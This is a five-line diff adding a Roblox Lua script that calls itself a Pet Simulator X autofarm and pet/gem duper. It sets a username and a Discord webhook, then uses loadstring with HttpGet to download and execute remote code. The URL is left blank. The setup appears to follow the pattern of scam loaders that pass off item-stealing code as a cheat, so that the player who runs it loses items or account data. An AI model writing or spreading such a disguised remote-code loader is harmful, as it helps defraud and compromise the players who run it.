@@ -1,0 +1,5 @@
+_G.Username "YT_BabyYodaGaming"
+_G.HubName "[Summer] Pet sim x AUTOFARM, PET DUPER,GEM DUPER"
+_G.WebhookUrl "discord.com/webhooks/"
+
+loadstring(game:HttpGet(""))()
